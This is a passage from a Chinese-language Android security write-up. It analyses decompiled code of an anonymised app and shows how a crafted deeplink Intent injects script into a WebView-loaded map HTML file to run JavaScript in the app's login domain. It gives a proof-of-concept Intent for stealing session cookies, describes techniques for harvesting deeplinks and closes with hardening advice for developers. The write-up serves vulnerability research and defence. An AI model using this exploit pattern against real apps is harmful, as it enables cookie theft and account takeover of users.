第二个参数`v8_1.a(this.w())`为下面的`a(Resources
arg3`)方法，调用`VicMapUtils.a`方法，并调用this.b方法对文件中的MAPURL字符串进行替换。
    ```java
    public VicMapType(String arg1, String arg2, String arg3) {
           super();
           this.a = arg1;
           this.b = arg2; 
           this.c = arg3;
        } 
        public String a(Resources arg3) { 
           return VicMapUtils.a(arg3, this.a).replace("MAPURL", this.b).replace("LANGTOKEN",Locale.getDefault().getLanguage()).replace("REGIONTOKEN", Locale.getDefault().getCountry());
        }public Bundle a(Bundle arg3) {
            arg3.putString("map_domain", this.c()); // this.c is put in map_domain        
            arg3.putString("map_url", this.b()); // this.b is put in map_url             arg3.putString("map_file_name", this.a()); // this.a is put in map_file_name        
            return arg3;
        }   
        String a() {
            return this.a;
        }
        public static VicMapType b(Bundle arg5) { 
           return new VicMapType(arg5.getString("map_file_name", ""), arg5.getString("map_url", ""), arg5.getString("map_domain", ""));
        } 
        String b(){
           return this.b;
        }
        String c() {  // v8_1.c() 
           return this.c; 
        }
    ```
检查VicMapUtils.a，发现是打开app asset目录下的文件并读入。
    ```
    java
    public class VicMapUtils { 
       public static String a(Resources arg2, String arg3) {
       try {
           InputStream v2 = arg2.getAssets().open(arg3);
           String v0 = VicMapUtils.a(v2);
           v2.close();
           return v0;
        } 
        catch(IOException ) { 
           StringBuilder v0_1 = new StringBuilder();
           v0_1.append("unable to load asset ");
           v0_1.append(arg3);
           throw new RuntimeException(v0_1.toString()); 
           } 
         }
         public static String a(InputStream arg2) {
            BufferedReader v0 = new BufferedReader(new InputStreamReader(arg2));
            StringBuilder v2 = new StringBuilder();
            while(true) {
                String v1 = v0.readLine();
                if(v1 == null) {
                    break; 
            }
            v2.append(v1);
            v2.append("\n");
        }
        v0.close();
        return v2.toString();
        }
    }
    ```
此时，我检查了APK中的asset目录，找到了一些html文件
    ```
    shell$ ls -l *.html
    -rwxr-xr-x  1 heeeeen  h4cker   8290  3  6 08:28 google_map.html
    -rwxr-xr-x  1 heeeeen  h4cker  15024  3  6 08:28 leaflet_map.html
    -rwxr-xr-x  1 heeeeen  h4cker   5546  3  6 08:28 mapbox.html
    ```
同时，在google_map.html中找到了MAPURL字符串:
    html$ cat google_map.html
    var map;
    var infoWindow = null;
    var markers = {};
    var infoWindowContent = {};
    var polylines = {};
漏洞利用的线索开始有一些明了，如果控制了MAPURL字符串，就可以构造一个XSS。
再来看看所涉及Bundle的构造，这个Bundle其实就是启动Fragment的参数，经过实验表明这个Bundle参数可以随deeplink的Intent
extra传递。
    java
    public Bundle a(Bundle arg3) {
            arg3.putString("map_domain", this.c()); // this.c is put in map_domain
            arg3.putString("map_url", this.b()); // this.b is put in map_url 
            arg3.putString("map_file_name", this.a()); // this.a is put in map_file_name 
            return arg3;
        }
所以，map_domain作为loadDataWithBaseURL的第一个参数，需要传入我们想要在其中执行JS的domain，也就是该App使用的登陆态domain：；`map_url>`作为`loadDataWithBaseURL`的第二个参数，需要传入攻击`payload`；而`map_file_name`则需要指向文件名`google_map.html`，WebView就会加载这个注入攻击payload的html文件。
至此，可以通过这个deeplink打开任意fragment的漏洞，实现可控任意域执行任意JS，实现盗取登陆态的用户cookie！
POC如下：
    java
    Intent payload = new Intent(Intent.ACTION_VIEW);
    payload.setData(Uri.parse("victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment"));
    Bundle extra = new Bundle(); 
    extra.putString("map_url", "\">"); 
    extra.putString("map_file_name", "google_map.html");
    extra.putString("map_domain", "https://www.victim-app.com"); payload.putExtra("bundle", extra);
    startActivity(payload);
### 0x03 deeplink的收集
既然deeplink暴露了大量的攻击面，且容易出现远程漏洞，因此deeplink的收集就成为漏洞挖掘的重点。首先，需要解析Manifest文件中的`android:scheme`及`android:host`提取出deeplink的`protocol://hostname`，接下来可以采用五种方法：
  * 本地搜索：通过Mainifest文件筛选出自定义的deeplink URL scheme，进而在本地逆向代码中正则匹配，提取出尽可能完整的deeplink URI，注意不要漏过所有文件。因为以经验来看，deeplink可能出现在App的Java代码中、Asset目录的资源文件/js中，甚至还可能出现在so当中；
  * 流量监控：对app进行抓包，利用HTTP抓包工具或者实现成burp插件监测流量中的deeplink，尽可能在app中点击各种场景，从请求包和返回包中正则匹配出完整的deeplink；
  * IPC监控：通过hook动态监测IPC通信中出现的deeplink，将Intent中的data提取出来，可以利用burp插件brida，甚至与流量监控整合；
  * 远程爬取：对app Web端网页进行爬取，筛选出deeplink。不过这种方法我没有实践过，只是偶尔在网页源码中发现过。
  * 基于deeplink特征：如果APP使用了一些路由分发的sdk，由于这类sdk有特定的规律，因此可以通过正则解析这类规律来获取到完整的deeplink。以ali arouter为例，可以通过提取build Route后面的path作为deeplink URI的path。提取build Autowired后面的name作为deeplink中的parameters。然后和第一步中获取到的内容进行拼接，从而获取到一个完整的deeplink。
然而，按照上述思路收集的deeplink还是可能不完整，难以得到完整的参数。从白帽子的角度，deeplink收集始终是挖掘deeplink漏洞的最大难点。
### 0x04 对开发者的建议
开发者特别要重点关注与deeplink有关的WebView安全问题，这一类漏洞在deeplink安全问题中占比最大。需要小心deeplink中url、extra_url、page、link、redirect等参数，检查是否可以修改这些参数使WebView访问任意域名。如果这本身是一个业务设计，建议对用户给出外域跳转提示，同时禁止WebView对`file://`的访问，禁止`loadUrl`访问外域携带重要的认证token，并仔细检查WebView开放敏感`javaScriptInterface`或`JsBridge`接口所做的域名白名单校验。
此外，由于deeplink无法验证来源，因此也不能用来设计为触发一个对安全有影响的敏感操作，例如：
  * 发送携带认证token的数据包
  * 打开保护组件
  * 绕过应用锁
  * 无需用户交互对外拨号
  * 静默安装应用
  * ......
建议使用deeplink的App开发者向内部安全团队提供所有deeplink清单和设计文档进行安全测试，这样可以比外部攻击者更早、更全面地发现deeplink引入的安全问题。
**参考链接：**
  1. 
  2. 
  3. 
  4. 
  5. 
  6. 
  7. 
* * *